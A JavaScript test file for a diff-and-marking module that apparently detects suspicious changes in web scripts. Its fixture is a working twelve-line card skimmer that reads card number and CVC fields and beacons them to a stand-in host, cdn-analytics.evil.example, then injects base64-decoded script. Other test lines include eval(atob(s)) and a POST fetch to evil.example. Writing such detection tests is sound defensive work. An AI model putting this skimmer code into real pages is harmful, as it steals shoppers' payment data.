import { test } from 'node:test';
import assert from 'node:assert/strict';
import { formatJs, diffLines, markLine, renderDiff } from '../../src/report/diff.js';

test('formats a minified file into statements', () => {
  assert.deepEqual(formatJs('function a(){var b=1;if(b){c("x;y{}")}return b}'), ['function a(){', '  var b=1;', '  if(b){', '    c("x;y{}")', '  }', '  return b', '}']);
  assert.deepEqual(formatJs('var r=/a;b{/g;x=`a;{b}`;for(i=0;i<2;i++)f()'), ['var r=/a;b{/g;', 'x=`a;{b}`;', 'for(i=0;i<2;i++)f()']);
  assert.deepEqual(formatJs('a();\n\n  // note\nb();'), ['a();', '// note', 'b();']);
});

test('diffLines finds the shortest edit', () => {
  assert.deepEqual(diffLines(['a', 'b', 'c'], ['a', 'x', 'c']).map((d) => `${d.op}${d.line}`), [' a', '-b', '+x', ' c']);
  assert.deepEqual(diffLines([], ['a']).map((d) => `${d.op}${d.line}`), ['+a']);
  assert.deepEqual(diffLines(['a', 'b'], ['a', 'b']).map((d) => d.op), [' ', ' ']);
});

test('markLine marks hostnames, code-running calls, network sends and sensitive fields', () => {
  assert.deepEqual(markLine("fetch('https://x.evil.example/c',{method:'POST'})"), ['hostname', 'network']);
  assert.deepEqual(markLine('eval(atob(s))'), ['code-run']);
  assert.deepEqual(markLine("document.querySelector('input[name=cardnumber]').value"), ['sensitive-field']);
  assert.deepEqual(markLine('var total = price * qty;'), []);
});

const app = Array.from({ length: 40 }, (_, i) => `function step${i}(){return ${i}}`).join('\n');
const skimmer = [
  "document.addEventListener('submit',function(){",
  "var f=document.querySelector('input[name=cardnumber]').value;",
  'var e=document.querySelector("input[name=cvc]").value;',
  'var d=btoa(f+"|"+e);',
  'var i=new Image();',
  "i.src='https://cdn-analytics.evil.example/p.gif?d='+d;",
  '});',
  'setTimeout(function(){',
  'var s=document.createElement("script");',
  's.text=atob(window.k);',
  'document.head.appendChild(s);',
  '},500);',
];

test('diff shows the 12 added lines of a skimmer and marks the hostname line', () => {
  const lines = app.split('\n');
  const changed = [...lines.slice(0, 20), ...skimmer, ...lines.slice(20)].join('\n');
  const { issue, full } = renderDiff(app, changed);
  const added = issue.split('\n').filter((l) => l.startsWith('+'));
  assert.equal(added.length, 12);
  assert.match(added.find((l) => l.includes('evil.example')), /◀ hostname/);
  assert.match(added.find((l) => l.includes('cardnumber')), /◀ sensitive-field/);
  assert.ok(issue.startsWith('```diff\n') || issue.startsWith('````diff\n'));
  assert.equal(full.split('\n').filter((l) => l.startsWith('+')).length, 12);
});

test('caps the issue diff at 60 lines and keeps the rest for the summary', () => {
  const extra = Array.from({ length: 100 }, (_, i) => `var added${i}=${i};`).join('\n');
  const { issue, full } = renderDiff(app, `${app}\n${extra}`);
  assert.ok(issue.split('\n').filter((l) => /^[+-]/.test(l)).length <= 60);
  assert.match(issue, /40 more changed lines/);
  assert.equal(full.split('\n').filter((l) => l.startsWith('+')).length, 100);
});

test('the issue shows marked hunks first when the diff is long', () => {
  const filler = Array.from({ length: 80 }, (_, i) => `var f${i}=${i};`);
  const lines = app.split('\n');
  const changed = [...filler, ...lines.slice(0, 30), "x.src='https://late.evil.example/c'", ...lines.slice(30)].join('\n');
  assert.match(renderDiff(app, changed).issue, /late\.evil\.example/);
});

test('shows an excerpt with marks when no previous copy exists', () => {
  const { issue } = renderDiff(null, `${app}\n${skimmer.join('\n')}`);
  assert.match(issue, /No earlier copy/);
  assert.match(issue, /evil\.example.*◀ hostname/);
  assert.match(issue, /createElement\("script"\).*◀ code-run/);
});

test('hunks past the line budget are left out entirely', () => {
  const lines = app.split('\n');
  const changed = lines.map((l, i) => ([5, 20, 35].includes(i) ? `${l} // changed` : l)).join('\n');
  const { issue } = renderDiff(app, changed, { maxLines: 1 });
  assert.equal(issue.split('\n').filter((l) => l.startsWith('@@')).length, 1);
  assert.match(issue, /2 more changed lines/);
});
